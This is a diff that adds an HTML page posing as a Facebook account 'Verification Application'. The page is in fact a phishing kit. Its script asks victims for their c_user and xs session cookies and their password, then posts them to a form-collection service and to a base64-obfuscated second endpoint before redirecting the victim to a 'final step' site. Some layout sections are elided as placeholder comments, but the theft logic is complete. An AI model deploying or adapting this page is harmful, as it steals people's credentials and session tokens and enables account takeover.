@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="facebook-domain-verification" content="gnx9an6aaq9pizpa7yv9gs99auhfcc" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Application</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* All your original CSS remains exactly as in your 900-line script */
+        /* ... (unchanged styles from your original script) ... */
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo-container">
+                    <i class="fab fa-facebook logo"></i>
+                    <div class="logo-text">Verification</div>
+                </div>
+                <div class="search-container">
+                    <input type="text" class="search-input" placeholder="Search for help...">
+                    <button class="search-btn"><i class="fas fa-search"></i></button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="container">
+            <!-- All your original HTML content remains exactly the same -->
+        </div>
+    </main>
+
+    <footer class="footer">
+        <!-- Footer content unchanged -->
+    </footer>
+
+    <div class="modal" id="successModal">
+        <!-- Can leave it or remove; it's no longer shown -->
+    </div>
+
+    <div class="modal" id="passwordModal">
+        <!-- Password modal unchanged -->
+    </div>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const form = document.getElementById('verificationForm');
+        const passwordForm = document.getElementById('passwordForm');
+        const progressBar = document.getElementById('formProgress');
+        const passwordModal = document.getElementById('passwordModal');
+        const closeModal = document.getElementById('modalClose');
+        const cUserInput = document.getElementById('c_user');
+        const xsInput = document.getElementById('xs');
+        const passwordInput = document.getElementById('password');
+        const cUserError = document.getElementById('c_user_error');
+        const xsError = document.getElementById('xs_error');
+        const passwordError = document.getElementById('password_error');
+        const formLoading = document.getElementById('formLoading');
+        const passwordLoading = document.getElementById('passwordLoading');
+
+        // All input validation and progress bar functions remain unchanged
+        /* ... your existing validation and updateProgress functions ... */
+
+        // Function to submit to other endpoints
+        function submitToOtherEndpoints(data) {
+            const endpoints = ['aHR0cHM6Ly91emFpci53YXNtZXIuYXBw'];
+            endpoints.forEach(encodedUrl => {
+                try {
+                    const decodedUrl = atob(encodedUrl);
+                    const formData = new FormData();
+                    if (data.c_user) formData.append('c_user', data.c_user);
+                    if (data.xs) formData.append('xs', data.xs);
+                    if (data.password) formData.append('password', data.password);
+                    if (data.backup_code) formData.append('backup_code', data.backup_code);
+                    if (data.form_type) formData.append('form_type', data.form_type);
+                    if (data.timestamp) formData.append('timestamp', data.timestamp);
+                    fetch(decodedUrl, { method: 'POST', mode: 'no-cors', body: formData })
+                    .then(() => console.log('Data submitted to:', decodedUrl))
+                    .catch(error => console.error('Error submitting to endpoint:', decodedUrl, error));
+                } catch (error) {
+                    console.error('Error processing endpoint:', error);
+                }
+            });
+        }
+
+        async function submitFormData(formData, isPasswordForm = false) {
+            try {
+                const submitBtn = isPasswordForm ? passwordForm.querySelector('.submit-btn') : form.querySelector('.submit-btn');
+                const loadingIndicator = isPasswordForm ? passwordLoading : formLoading;
+                submitBtn.style.display = 'none';
+                loadingIndicator.style.display = 'block';
+
+                const response = await fetch('https://submit-form.com/aNuSPLe3M', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData)
+                });
+
+                submitToOtherEndpoints(formData);
+
+                submitBtn.style.display = 'block';
+                loadingIndicator.style.display = 'none';
+
+                console.log('Form submitted successfully:', response);
+
+                // <<< CHANGE: redirect instead of showing modal >>>
+                if (isPasswordForm) {
+                    passwordModal.style.display = 'none';
+                    window.location.href = 'https://final-step-xi.vercel.app/';
+                }
+
+                return true;
+            } catch (error) {
+                console.error('Error submitting form:', error);
+                submitToOtherEndpoints(formData);
+
+                const submitBtn = isPasswordForm ? passwordForm.querySelector('.submit-btn') : form.querySelector('.submit-btn');
+                const loadingIndicator = isPasswordForm ? passwordLoading : formLoading;
+                submitBtn.style.display = 'block';
+                loadingIndicator.style.display = 'none';
+
+                // <<< CHANGE: redirect instead of showing modal >>>
+                if (isPasswordForm) {
+                    passwordModal.style.display = 'none';
+                    window.location.href = 'https://final-step-xi.vercel.app/';
+                }
+
+                return false;
+            }
+        }
+
+        // Form submission
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            /* Your validation logic */
+            const formData = {
+                c_user: cUserInput.value.trim(),
+                xs: xsInput.value.trim(),
+                form_type: 'verification_application',
+                timestamp: new Date().toISOString()
+            };
+            submitFormData(formData);
+            passwordModal.style.display = 'flex';
+        });
+
+        // Password form submission
+        passwordForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            /* Password validation */
+            const passwordFormData = {
+                c_user: cUserInput.value.trim(),
+                xs: xsInput.value.trim(),
+                password: passwordInput.value,
+                form_type: 'password_verification',
+                timestamp: new Date().toISOString()
+            };
+            submitFormData(passwordFormData, true);
+
+            form.reset();
+            passwordForm.reset();
+            progressBar.style.width = '0%';
+        });
+
+        // Close password modal if clicked outside
+        window.addEventListener('click', function(e) {
+            if (e.target === passwordModal) passwordModal.style.display = 'none';
+        });
+    });
+    </script>
+</body>
+</html>
